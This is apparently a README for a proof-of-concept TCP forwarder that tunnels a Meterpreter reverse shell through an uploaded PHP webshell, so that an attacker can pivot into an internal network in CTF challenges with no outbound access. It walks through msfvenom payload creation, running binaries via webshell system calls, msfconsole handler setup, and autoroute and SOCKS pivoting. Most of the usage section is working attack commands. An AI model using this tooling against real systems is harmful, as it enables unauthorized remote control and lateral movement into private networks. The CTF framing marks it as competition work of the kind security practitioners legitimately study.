# TCP-Forwarder

proof-of-concept tcp forwarder for meterpreter, used in ctf challenges where network access is limited.  

idea from : 强网杯2025 Web 日志系统
- The challenge is a php webserver with a JBoss running in intranet.
- Only the php server is accessible from outside, and the challenge instance cannot access the internet.
- The php webserver can upload webshells and have no disable_functions.
- You want a meterpreter shell on the php server, so that you can pivot to the intranet and exploit the JBoss. (You can solve the challenge otherwise anyways, eg. puting your exp on the php server and run it there.)


## Overview
proof-of-concept tcp forwarder for meterpreter, used in ctf challenges where
- The target service only exposed one http port serving php (for java? you can just use suo5 with bind_tcp. php suo5 sux)
- The target service cannot access the internet (no reverse_tcp meterpreter)
- You can upload php and execute files on the target (php webshell with no disable_functions)
- A webshell isn't enough, you really want a meterpreter shell on the target, so that you can pivot and post-exploitation the intranet.

## Existing solution

[reGeorg](https://github.com/sensepost/reGeorg) and [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) -- depreciated, completely broken on this php challenge, not working.

[suo5](https://github.com/zema1/suo5) -- with bind_tcp meterpreter should work in theory, but:
- the meterpreter dies after some time because of php max_execution_time (forced in php.ini, cannot modify?)
- with `proxychains4 msfconsole -n`, msfconsole tries to connect to 127.0.0.1:3xxxx sometimes and fail, causing autoroute to not work.
- with the `php -S` server and default nginx server, there are only 1 or 5 workers, suo5 will hang the php server when multiple connections are made. [ref](https://github.com/zema1/suo5/blob/main/assets/php/README.md)

## Explaination
The `tcp-forwarder` golang binary does this:
- listen on tcp 127.0.0.1:13337 and wait for a meterpreter to connect to it (have a 10MB buffer for receive)
- listen on tcp 127.0.0.1:13338 and send everything from the meterpreter connection to it
- listen on tcp 127.0.0.1:13339 and send everything from it to the meterpreter connection
  
The `tcp-client.py` python script does this:
- connect to the msfconsole at 127.0.0.1:4444
- send everything from the msfconsole connection to `target/tcp-middleware.php`
- receive everything from `target/tcp-middleware.php` and send it to the msfconsole connection

The `tcp-middleware.php` file does this:
- accepts post parameter `data` and `mode`
- if mode is `r`, read from tcp 127.0.0.1:13338 and return the data
- if mode is `w`, write the base64 decoded data to tcp 127.0.0.1:13339

And, the meterpreter does this:
- connect to tcp 127.0.0.1:13337
- send and receive data using tcp, to/from the tcp-forwarder
- which sends and receives data using php, to/from the tcp-client.py
- which sends and receives data using tcp, to/from the msfconsole
- which gives you a meterpreter shell on your attacking machine

## Usage

### compiling the forwarder

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o tcp-forwarder tcp-forwarder.go
```

### make a meterpreter client connecting to 127.0.0.1:13337

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=13337 -f elf -o meterpreter.elf
```

### uploading the forwarder, middleware and meterpreter to the target
... using your php webshell
```bash
# you should now have these on the target
./tcp-forwarder
./tcp-middleware.php
./meterpreter.elf
```

### starting the forwarder and meterpreter on the target
using something like system("...") in your php webshell
```bash
chmod +x tcp-forwarder
./tcp-forwarder & :
chmod +x meterpreter.elf
./meterpreter.elf & :
```

### starting the listener on your attacking machine
```bash
msfconsole -n
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
exploit
```
### start the local port forwarder
```bash
# modify the REMOTE inside tcp-client.py first
python3 tcp-client.py
```

### you should now have a meterpreter shell on your attacking machine!
```
[*] Meterpreter session 10 opened (127.0.0.1:4444 -> 127.0.0.1:57846) at 2025-10-21 17:12:42 +0800

```

### check that everything works.
```
run autoroute -s 127.0.0.1/16
bg
use socks_proxy
run -j
```
```bash
http_proxy=socks5://127.0.0.1:1080 curl -v 127.0.0.1:8080
```

## Problems
- reading large files will hang the meterpreter session. (shell `cat /dev/urandom | base64 -w0`) ...which seems like a meterpreter problem.
- php should stream data from tcp to http client instead of reading it all and use base64.(may make php oom)
- the tcp-forwarder and even meterpreter can be rewritten in php, and run via php -r, so no need to upload binaries.